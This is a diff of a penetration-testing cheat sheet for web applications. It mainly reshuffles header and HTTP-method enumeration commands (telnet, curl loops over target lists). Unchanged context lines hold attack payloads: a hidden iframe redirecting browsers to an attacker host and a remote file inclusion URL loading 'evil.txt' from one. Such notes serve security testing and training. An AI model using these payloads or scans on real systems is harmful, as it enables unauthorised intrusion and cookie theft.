@@ -43,15 +43,6 @@ cd /root/scripts/
 python -m SimpleHTTPServer 80
 ------------------------------------------------------------------------------------------------------
 
-# Apache version, eTag, HTTP Basic Authentication Enabled
-
-telnet <target IP> 80
-HEAD / HTTP/1.0
-(hit enter 2x)
-
-for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
-------------------------------------------------------------------------------------------------------
-
 # Browser Redirection
 
 <iframe SRC="http://attackerIP/report" height = "0" width ="0">
@@ -72,8 +63,6 @@ Secure - only send over an encrypted channel
 Firefox
 Cookies > View Cookie Information
 HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not return a value.
-
-for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
 ------------------------------------------------------------------------------------------------------
 
 # Cookie Stealing
@@ -107,9 +96,24 @@ When fuzzing headers, disable URL Encode.
 When you are inside of a POST parameter, always use URL encoding.
 ------------------------------------------------------------------------------------------------------
 
-# Headers
+# Headers, Apache version, eTag, HTTP Basic Authentication Enabled
 
-curl -i -X targetURL
+telnet <target IP> 80
+HEAD / HTTP/1.0
+(hit enter 2x)
+
+curl -iksX HEAD <target IP>
+
+for i in `cat 80.txt` ; do curl -iksX HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
+------------------------------------------------------------------------------------------------------
+
+# HTTP methods allowed
+
+telnet <target IP> 80
+OPTIONS / HTTP/1.0
+(hit enter 2x)
+
+curl -iksX OPTIONS <target IP>
 ------------------------------------------------------------------------------------------------------
 
 # Local file inclusion
@@ -130,17 +134,6 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 # Remote File Inclusion
 
 http://target IP/index.php?page=http://attackerIP/evil.txt
-------------------------------------------------------------------------------------------------------
-
-# TRACE / TRACK methods allowed
-
-telnet <target IP> 80
-OPTIONS / HTTP/1.0
-(hit enter 2x)
-
-Check for cross-site tracing (XST)
-curl -X TRACE <target IP>
-curl -X TRACE -H "Cookie: name=value" <target>
 ------------------------------------------------------------------------------------------------------
 
 # URL Encoding
